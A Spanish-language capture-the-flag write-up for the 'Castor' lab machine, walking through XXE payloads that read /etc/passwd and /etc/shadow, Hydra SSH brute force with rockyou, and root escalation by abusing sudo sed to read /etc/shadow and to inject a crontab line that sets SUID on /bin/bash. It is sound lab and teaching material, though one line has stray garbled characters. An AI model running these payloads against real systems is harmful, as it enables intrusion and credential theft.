# Write-Up: Castor - The Hackers Labs

## Información General

- **Nombre de la máquina**: Castor
- **Plataforma**: The Hackers Labs
- **Dificultad**: Básico/Intermedio
- **Sistema Operativo**: Linux
- **Objetivos**: Obtención de la Flag de usuario y de root
- **Fecha de resolución**: 9 de Julio de 2026

---

## FASE 1: ENUMERACIÓN

### Descubrimiento de Puertos

```bash
nmap -sV -p- IP_DE_LA_MAQUINA
```

**Resultado:**

| Puerto | Estado | Servicio | Versión |
|--------|--------|----------|---------|
| 22/tcp | Open | SSH | OpenSSH |
| 80/tcp | HTTP | Apache | Apache httpd |

**Análisis:**
- Puerto 22: SSH — posibles vulnerabilidades de brute force
- Puerto 80: Servidor web — punto de entrada principal

---

## FASE 2: EXPOSICIÓN

### Intento 1: Exploración Web (EXITOSO)

Al acceder a `http://IP_DE_LA_MAQUINA` se encontró una página con un endpoint que procesaba XML.

---

### Intento 2: XXE en endpoint XML (EXITOSO)

Se descubrió que el servidor procesaba payloads XML con las flags:
```php
$dom->loadXML($xml, LIBXML_NOENT | LIBXML_DTDLOAD);
```

Esto permite **XML External Entity (XXE)** injection.

**Payload para leer archivos:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
 <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
 <name>&xxe;</name>
</root>
```

**Resultado:**
Se obtuvo el contenido de `/etc/passwd` con los usuarios del sistema:
- `root` (uid 0) — `/bin/bash`
- `castorcin` (uid 1001) — `/bin/bash`

**Análisis:**
- El endpoint era `upload.php` pero en realidad era un parser XML vulnerable
- Las flags `LIBXML_NOENT | LIBXML_DTDLOAD` habilitaban XXE
- Se confirmó lectura de archivos del sistema

---

### Intento 3: Leer /etc/shadow (FALLIDO)

```xml
<!ENTITY xxe SYSTEM "file:///etc/shadow">
```

**Resultado:**
```
Warning: DOMDocument::loadXML(/etc/shadow): Failed to open stream: Permission denied
```

**Análisis:**
- El servidor web (`www-data`) no tiene permisos para leer `/etc/shadow`
- Se descartó esta vía para crackeo de contraseñas

---

### Intento 4: PHP expect wrapper (FALLIDO)

```xml
<!ENTITY xxe SYSTEM "expect://whoami">
```

**Resultado:**
```
Warning: Unable to find the wrapper "expect"
```

**Análisis:**
- El wrapper `expect` no está habilitado en el PHP del servidor
- Se descartó esta vía para ejecución de comandos

---

### Intento 5: php://filter para lectura (EXITOSO)

```xml
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
```

**Resultado:**
Se obtuvo `/etc/passwd` en base64, que al decodificar mostraba los mismos usuarios.

**Análisis:**
- `php://filter` funciona para lectura de archivos
- Útil cuando el output directo no funciona

---

### Intento 6: Fuerza Bruta SSH con Hydra (EXITOSO)

Con los usuarios encontrados en `/etc/passwd`, se procedió a brute force SSH:

```bash
# Crear archivo de usuarios
echo -e "castorcin" > users.txt

# Brute force con Hydra
hydra -l castorcin -P /usr/share/wordlists/rockyou.txt ssh://IP_DE_LA_MAQUINA
```

**Resultado:**
```
[22][ssh] host: IP_DE_LA_MAQUINA login: castorcin password: [CONTRASEÑA_ENCONTRADA]
```

**Análisis:**
- El usuario `castorcin` tenía una contraseña débil
- Rockeyword找到了 la contraseña en segundos
- Se confirmó reutilización de credenciales

---

## FASE 3: ACCESO INICIAL

### SSH como castorcin (EXITOSO)

```bash
ssh castorcin@IP_DE_LA_MAQUINA
```

**Contraseña:** [La encontrada por Hydra]

**Resultado:**
```
castorcin@TheHackersLabs-Castor:~$ whoami
castorcin
```

---

### User Flag

```bash
castorcin@TheHackersLabs-Castor:~$ ls -la
total 28
drwx------ 2 castorcin castorcin 4096 ene 6 2026 .
drwxr-xr-x 3 root root 4096 ene 6 2026 ..
-rw------- 1 castorcin castorcin 154 ene 6 2026 .bash_history
-rw------- 1 castorcin castorcin 220 ene 6 2026 .bash_logout
-rw------- 1 castorcin castorcin 3526 ene 6 2026 .bashrc
-rw------- 1 castorcin castorcin 807 ene 6 2026 .profile
-rw------- 1 root root 36 ene 6 2026 user.txt

castorcin@TheHackersLabs-Castor:~$ cat user.txt
```

---

## FASE 4: ESCALADA DE PRIVILEGIOS

### Los 5 comandos iniciales

```bash
whoami # castorcin
id # uid=1001(castorcin) gid=1001(castorcin) groups=1001(castorcin)
sudo -l # (ALL : ALL) NOPASSWD: /usr/bin/sed
```

**Análisis:**
- `sudo -l` mostró que castorcin puede ejecutar `sed` como root SIN contraseña
- Esto es un vector de escalada directo

---

### Intento 7: Explotar sed para leer /etc/shadow (EXITOSO)

```bash
sudo sed -n '1p' /etc/shadow
```

**Resultado:**
```
root:$y$j9T$Eq7v/abVvURRONvMMttjJ0$C.QUDl5zm8kHf0gWkBlvLDUumvjS1cPZpJLZzilNzQ3:20459:0:99999:7:::
```

**Análisis:**
- `sed` con sudo puede leer archivos como root
- Se obtuvo el hash de root
- Formato yescrypt (`$y$`)

---

### Intento 8: Crackear hash con John (FALLIDO)

```bash
echo 'root:$y$j9T$...' > hash.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

**Resultado:**
```
No password hashes loaded (see FAQ)
```

**Análisis:**
- John no reconoce el formato yescrypt (`$y$`)
- Necesita versión jumbo o hashcat

---

### Intento 9: Crackear hash con Hashcat (FALLIDO)

```bash
hashcat -m 7400 hash.txt /usr/share/wordlists/rockyou.txt
```

**Resultado:**
```
Token length exception
```

**Análisis:**
- Hashcat v7.1.2 no soporta yescrypt correctamente
- El formato `$y$` es demasiado nuevo
- Se descartó el crackeo de contraseñas

---

### Intento 10: Usar sed para escribir en /etc/crontab (EXITOSO)

En lugar de crackear, se usó sed para escribir un cronjob que ejecutara bash con SUID:

```bash
echo '* * * * * root chmod u+s /bin/bash' | sudo sed -i '1r /dev/stdin' /etc/crontab
```

**Análisis:**
- `sed -i` puede modificar archivos como root
- Se escribió un cronjob que cada minuto ejecuta `chmod u+s /bin/bash`
- Cuando root ejecute el cronjob, bash tendrá SUID

---

### Intento 11: Esperar 1 minuto y obtener root (EXITOSO)

```bash
# Esperar 1 minuto a que el cronjob se ejecute
sleep 60

# Verificar que bash tiene SUID
ls -la /bin/bash
# -rwsr-xr-x 1 root root ... /bin/bash

# Obtener root
/bin/bash -p
whoami
# root
```

**Análisis:**
- El cronjob ejecutó `chmod u+s /bin/bash` como root
- `/bin/bash` quedó con SUID
- `/bin/bash -p` preserva privilegios y da shell de root

---

### Root Flag

```bash
bash-5.2# cat /root/root.txt
```

---

## FASE 5: FLAGS

### User Flag
```bash
cat /home/castorcin/user.txt
```

### Root Flag
```bash
/bin/bash -p
cat /root/root.txt
```

---

## CADENA DE EXPOLOTACIÓN COMPLETA

```
┌─────────────────────────────────────────────────────────┐
│ 1. XXE en upload.php → lectura de /etc/passwd │
│ 2. Enumeración de usuarios → castorcin │
│ 3. Hydra brute force → contraseña de castorcin │
│ 4. SSH como castorcin → user flag │
│ 5. sudo -l → sed con NOPASSWD │
│ 6. sed lee /etc/shadow → hash de root │
│ 7. sed escribe en /etc/crontab → chmod u+s /bin/bash │
│ 8. Cronjob ejecuta → bash con SUID │
│ 9. /bin/bash -p → root │
└─────────────────────────────────────────────────────────┘
```

| Fase | Técnica | Herramientas |
|------|---------|--------------|
| Reconocimiento | XXE para lectura de archivos | cURL, navegador |
| Explotación web | XXE → /etc/passwd | XML payload |
| Acceso | Fuerza bruta SSH | Hydra, rockyou.txt |
| Escalada | Sudo sed → cronjob | sed, /etc/crontab |

---

## HERRAMIENTAS UTILIZADAS

| Herramienta | Propósito |
|-------------|-----------|
| Nmap | Escaneo de puertos y servicios |
| cURL | Envío de payloads XXE |
| Hydra | Fuerza bruta SSH |
| SSH | Acceso remoto |
| sed | Lectura/escritura de archivos con sudo |
| GTFOBins | Referencia para técnicas de escalada |

---

## ERRORES Y PROBLEMAS ENCONTRADOS

### Error 1: /etc/shadow no se puede leer con XXE
- **Problema:** `Permission denied` al intentar leer `/etc/shadow`
- **Causa:** El servidor web (`www-data`) no tiene permisos
- **Solución:** Se usó `sed` con sudo para leerlo

### Error 2: expect wrapper no funciona
- **Problema:** `Unable to find the wrapper "expect"`
- **Causa:** PHP no tiene habilitado el wrapper expect
- **Solución:** Se usó `php://filter` para lectura

### Error 3: John no reconoce yescrypt
- **Problema:** `No password hashes loaded`
- **Causa:** El formato `$y$` (yescrypt) es demasiado nuevo
- **Solución:** Se descartó crackeo, se usó sed para escalada

### Error 4: Hashcat falla con yescrypt
- **Problema:** `Token length exception`
- **Causa:** Hashcat v7.1.2 no soporta yescrypt correctamente
- **Solución:** Se buscó otro vector de escalada

### Error 5: Hydra no conecta a SSH inicialmente
- **Problema:** `Connection refused`
- **Causa:** Posible firewall o IP incorrecta
- **Solución:** Se verificó la IP y se reintentó

---

## LECCIONES APRENDIDAS

1. **XXE es poderoso:** Permite leer archivos del servidor si el parser XML no está configurado correctamente
2. **LIBXML_NOENT es peligroso:** Habilita la sustitución de entidades externas
3. **php://filter funciona:** Útil cuando la lectura directa falla
4. **Hydra es rápido:** Con el usuario correcto, rockyou.txt encuentra contraseñas en segundos
5. **sed con sudo es escalada:** Si puedes ejecutar sed como root, puedes modificar cualquier archivo
6. **Cronjobs son útiles para escalada:** Escribir en /etc/crontab te da ejecución periódica como root
7. **No siempre necesitas crackear:** A veces es más fácil explotar permisos que crackear contraseñas
8. **GTFOBins es tu amigo:** Siempre buscar herramientas con SUID o sudo en GTFOBins

---

## REFERENCIAS

- [GTFOBins - sed](https://gtfobins.github.io/gtfobins/sed/#sudo)
- [HackTricks - Linux Privilege Escalation](https://book.hacktricks.ru/linux-hardening/privilege-escalation)
- [OWASP - XXE](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing)

---

*Write-up creado el 13 de Julio de 2026*


---

## 🔗 Red de Conocimiento

### Documentos Relacionados

- [[Banco-THL.md|Banco-THL]] — Hydra, Linux, Path Traversal / LFI
- [[../informes/Informe_Castor.md|Informe_Castor]] — Hydra, John / Hashcat, XXE
- [[Nike-THL.md|Nike-THL]] — Hydra, Path Traversal / LFI, XXE
- [[../informes/Informe_Rockstars.md|Informe_Rockstars]] — Hydra, Linux, Path Traversal / LFI
- [[Rockstars-THL.md|Rockstars-THL]] — Hydra, John / Hashcat, Path Traversal / LFI
- [[../apuntes Andres/08.07.2026 Path Traversal, LFI y Escalada - Máquina Banco.md|08.07.2026 Path Traversal, LFI y Escalada - Máquina Banco]] — Hydra, Path Traversal / LFI, XXE

### 🛠️ Herramientas

- [[comandos/Hydra|Hydra]]
- [[comandos/John_Hashcat|John / Hashcat]]
- [[comandos/Nmap|Nmap]]
- [[comandos/SSH|SSH]]

### 🎯 Vulnerabilidades Relacionadas

- [[Apuntes/05 - Auditoria Web/Path Traversal — 6 Casos y Bypasses.md|Path Traversal / LFI]]
- [[Apuntes/05 - Auditoria Web/XXE — XML External Entity.md|XXE]]

> #escalada-privilegios #hydra #john #lfi #linux #nmap #redes #ssh #xxe
